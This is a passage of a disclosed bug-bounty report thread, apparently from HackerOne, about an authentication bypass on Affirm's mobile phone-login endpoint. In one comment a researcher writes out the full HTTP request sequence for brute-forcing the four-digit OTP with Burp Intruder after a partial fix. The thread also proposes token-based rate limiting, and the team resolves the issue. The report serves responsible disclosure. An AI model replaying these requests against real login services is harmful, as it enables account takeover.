because it is a bypass for #766578.","automated_response":false,"created_at":"2020-01-14T07:14:28.887Z","updated_at":"2020-01-14T07:15:19.307Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":683996,"filename":"affirm.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oL9A3uMEsMmE9yKBDzWG1usQ?response-content-disposition=attachment%3B%20filename%3D%22affirm.PNG%22%3B%20filename%2A%3DUTF-8%27%27affirm.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=089c1cb7d11e4f907235a3642dab6fef455a23f37040f57793bbaa849d88e9dc"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6763569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @who_has_no_name. Thank you for the verification. Do you mean the older method has been fixed on ODIN?\n\nCan you disclose the new exploitation? For now, please continue on this report, assume if the new exploitation is based on the same root vulnerability, that we didn't fix it completely. However, if after internal triage, it's determined to be another vulnerability, which is unrelated to the one that was previously exploitable, we can open another report.","automated_response":false,"created_at":"2020-01-14T07:28:34.174Z","updated_at":"2020-01-14T07:28:34.174Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6763600,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, older method has been fixed. I am not able to continue any further with the old exploitation method. \n\nYes please, I will definitely disclose the new exploitation. I am in the process of documenting it. \n\nAlso, if I am able to bypass the auth on the web application as well, Does that go as a new ticket or continuation of this?","automated_response":false,"created_at":"2020-01-14T07:36:01.661Z","updated_at":"2020-01-14T07:36:37.579Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6763642,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, just wanted to confirm, when you say \"I confirm the older method has been fixed. It is blocking me.\", do you mean the older method has been fixed on ODIN, or you mean production? Because, again the production has the new WAF rate limit rule, so being blocked on production does not necessarily mean the root vulnerability is fixed. So just wanted to confirm the fix that we pushed out is immune to at least your older exploitation.\n\nThis report exposed a vulnerability in the `/api/v3/login/phone/` endpoint, which is a login endpoint for mobile applications and is implemented based on the web application login endpoint implementation. Based on the previous triage, it is determined the vulnerability resides only on the mobile endpoint. So if you able to bypass the web application authentication, it might likely be another vulnerability on the web application login endpoint. However, I cannot say for sure at this moment. We'll have to internally triage first.","automated_response":false,"created_at":"2020-01-14T07:50:34.063Z","updated_at":"2020-01-14T07:50:34.063Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6764394,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the confusion.\n\nYes @xiuxiu_3803, on ODIN it is fixed with the older method.\n\nLet's make this simple. Answering your question\n==So just wanted to confirm the fix that we pushed out is immune to at least your older exploitation.==\nYes, You are immune to older exploitation. Removing the header no longer works.\n\nRemoving the header gives me this response\n\n```\nHTTP/1.1 401 UNAUTHORIZED\nDate: Tue, 14 Jan 2020 07:41:10 GMT\nContent-Type: application/json\nContent-Length: 98\nConnection: close\nServer: openresty\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiYmE1MDkwYzEtZTA5MS00OWUzLWFiZTAtNGQ5ZGJhNzEzOGNiIn0=\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: bba04725-94bf-4da9-cdbd-5e7633851fed\n\n{\"status_code\": 401, \"message\": \"Invalid Request\", \"code\": \"unauthorized\", \"type\": \"unauthorized\"}\n```\n\nSo I confirm the fix that is pushed, is correct to some extent. I am currently documenting the new exploitation. Give me some time.","automated_response":false,"created_at":"2020-01-14T08:46:38.007Z","updated_at":"2020-01-14T08:46:38.007Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6765510,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# New bypass/Exploit\n\nThis was a lot easier than I expected it to be.\n\n## Steps to reproduce\n\nMake a request to this endpoint\n\n```\nPOST /api/v3/login/phone/ HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 40\nHost: hackerone.affirm-odin.com\nConnection: close\nAccept-Encoding: gzip, deflate\nUser-Agent: okhttp/3.13.1\nAffirm-User-Agent: Affirm-Android\n\n{\"channel\":\"sms\",\"address\":\"7022170092\"}\n```\n\nNow you would get the response something similar to \n\n```\nHTTP/1.1 200 OK\nDate: Tue, 14 Jan 2020 09:02:24 GMT\nContent-Type: application/json\nConnection: close\nServer: openresty\nVary: Accept-Encoding\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiNzI1YmU5NmQtY2NkMy00MDFjLWEwMjktMmYzZGM4MjQ5OWIyIn0=\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJScvJy8gpy9PW3sDA28jAO81TSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAExuGgE.EP8VIA.SjZqfEXdqag1bYw15c1l0wPRW50\ncache-control: private, no-cache, no-store, must-revalidate\nX-Affirm-Request-Id: 4f53c152-e34d-4d66-cd3d-d9aa6dd46bcc\nStrict-Transport-Security: max-age=86400\nContent-Length: 299\n\n{\"response_url\": \"/api/v3/login/phone/F8LG9hNluILUx3SdYBfoEm9VylB-l7iqlvIhtEpT_jmUEAaDNS1KuLWJ-_5StZrXYZD5mOFwbZaIrwhj_MRFHoex_BnRBmS5euY_204ThRa9lyyR8LyAUjd9JwJLeLtap6jpPNyTs-lZYn9GlUlyylS-iROWkbA185fTE74ncAvNRIkRLb0ylmT3qO0W6cjQYxVXHEdhjAIC6-4S25hdghDh4SwRaI_6MzwGAxQ2hqtRys8Szjf88pZL9HvAHGci11E\"}\n```\n\nThe response_url is where the next request should be sent.\n\nSo the request for OTP should be something similar to this\n\n```\nPOST /api/v3/login/phone/ltRJnrPwBf0_bOeZLD0tadVBO97DBglnQ7mGDoQ_8Zq-vFoVZQbG59VXLUmIdv3D0WDWkcaLHOBLDORayazAVw0vAq0XAqZBJJ6dSC2TFcI4JIU5BOlORm_E85kx-9ATh546t-zAT_37FFldfRFBaiyjcKLCWjQm16I0wAKw7CN9A9zRfYnod81lrW8L6dTUtXjZxUfHMAfE3CXuL7fgOrAujIOmIt8JDmQpC6zeo4md6jDssDuceX_hXJYn8FisHm4 HTTP/1.1\nContent-Type: application/json; charset=UTF-8\nContent-Length: 19\nHost: hackerone.affirm-odin.com\nConnection: close\nAffirm-Device: eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=\nAffirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos\nAccept-Encoding: gzip, deflate\nAffirm-User-Agent: Affirm-Android\nAffirm-App-Version: 3.62.3\nAffirm-App-Version-Code: 312\nAffirm-OS-Version: 22\n\n{\"response\":\"0000\"}\n```\n\nThe new fix that you have provided checks for the headers Affirm-Client \u0026 Affirm-Device. Earlier this was not the case. The brute-force was possible without these headers\n\nWith these headers simply sending to Intruder and doing the Bruteforce is possible.\n\n### POC\n{F684124}\nIf you look carefully, I sent 135 requests, The status was 400 and the length was 629, a similar pattern was observed. \nAll of sudden, when a valid OTP is submitted by an Intruder, The status is 200 and the response is 674. \n\n{F684125}\nIf you look at the response, we are authenticated.\n\nI don't know why the developer hasn't implemented the fix I have provided earlier. This has a straight forward solution. ==Implement the rate-limiting on the token, the response_url==\n\n1 response URL is associated with 1 user\nIf multiple failed login attempts have been done on the token, ==Invalidate the token== No further requests will be entertained.\nIf an attacker wants to leverage this, there's no way he can do, because the response_url is already invalid.\n\n Next question is, should we allow as many tokens to be generated as an attacker/user wants?\nA big No! This is another limiting you can implement. \nOn one particular account/userID, limit the number of tokens to be generated by 5 or so. So if an attacker wants to exploit this, his chances of success are only 0.25%, very rare. This is because total no of probable OTP is 10000 (0000-9999) and he can only try 5 times per token for 5 tokens per user, which is 25.\n\nThis way, you don't need any firewall rules as well.\n\n==Please, don't trust the firewall rules as well. Most of the time firewall rules checks for the source IP, an attacker can use multiple IPs. For example if we only trust the firewall rules, and do not expire the token, an attacker can make the request on the token from as many IPs as he wants. So to bruteforce 10000 possible OTPs, an attacker would need 2000 IPs, which is quite difficult, but yes exploitable, if you only trust firewall.==","automated_response":false,"created_at":"2020-01-14T09:28:54.333Z","updated_at":"2020-01-14T09:28:54.333Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":684125,"filename":"a2.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Rwe5aWh8ECcRT5fuHYvos2a9?response-content-disposition=attachment%3B%20filename%3D%22a2.PNG%22%3B%20filename%2A%3DUTF-8%27%27a2.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fc32b8ac64a89b6819aa4efb6269b6af38d0edbe6b80402d7f28bf31ae01b277"},{"id":684124,"filename":"a1.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/41SL62PVdyoes2BYv8H1hDH7?response-content-disposition=attachment%3B%20filename%3D%22a1.PNG%22%3B%20filename%2A%3DUTF-8%27%27a1.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4701b5ce6bc8334a5c80cd767ebae4b7234dd8bb7e5967ae27f2b0ddfba21892"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6772276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@who_has_no_name I have the exact same finding in my side as well. The fix was not complete because the developer only enforced the headers (the device header is not required tho) but did NOT change the rate-limit counter.  ","automated_response":false,"created_at":"2020-01-14T23:31:53.620Z","updated_at":"2020-01-14T23:31:53.620Z","actor":{"username":"eto","cleared":false,"url":"/eto","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/260/246/7089e8dfda0a62db9deeb0b2ef6119d5dc2ef459_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":684824,"filename":"Screen_Shot_2020-01-14_at_3.30.38_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rrnAZ2tJyxX798sbya6KN8j9?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-01-14_at_3.30.38_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-01-14_at_3.30.38_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152453Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bd43bc2c6dbced3af1fa7293182351c35c084939dfe640687127d7ed3333ee80"}],"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6772598,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, @eto.\nI see that you have run Intruder from 0000 to 1234 :D The developer has to implement the rate limit counter on the token that has been generated.","automated_response":false,"created_at":"2020-01-15T00:34:06.201Z","updated_at":"2020-01-15T00:34:06.201Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6773004,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-01-15T02:24:23.756Z","updated_at":"2020-01-15T02:24:23.756Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6794156,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @who_has_no_name, this issue has been fixed. The reason that we were still able to exploit on the ODIN testing environment is because it's a sandbox environment. We have tested this on live environments and have confirmed it's fixed.\nAgain, thank you very much for the report and follow-up.","automated_response":false,"created_at":"2020-01-16T19:20:22.914Z","updated_at":"2020-01-16T19:20:22.914Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"yogesh_ojha","url":"/yogesh_ojha"},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9965826,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we please disclose this, as other hackers will get to read about this write-up?","automated_response":false,"created_at":"2020-11-30T19:00:30.221Z","updated_at":"2020-11-30T19:00:30.221Z","first_to_agree":true,"actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9968062,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-12-01T00:09:45.479Z","updated_at":"2020-12-01T00:09:45.479Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9968063,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-12-01T00:09:45.589Z","updated_at":"2020-12-01T00:09:45.589Z","actor":{"username":"xiuxiu_3803","cleared":false,"url":"/xiuxiu_3803","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9969388,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much!","automated_response":false,"created_at":"2020-12-01T05:43:45.386Z","updated_at":"2020-12-01T05:43:45.386Z","actor":{"username":"yogesh_ojha","cleared":true,"url":"/yogesh_ojha","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/4xFdD6FL2ncq9iYvSZYFv64S/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"affirm","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}